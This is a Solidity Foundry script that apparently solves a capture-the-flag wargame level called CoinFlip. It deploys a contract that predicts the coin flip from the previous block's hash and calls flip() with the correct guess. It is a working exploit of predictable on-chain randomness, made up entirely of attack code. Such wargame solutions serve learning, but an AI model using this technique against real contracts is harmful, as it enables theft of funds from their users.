// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {CoinFlip} from "src/Coinflip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinflipSolution is Script {
    CoinFlip public coinflip =
        CoinFlip(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflip);
        vm.stopBroadcast();
    }
}
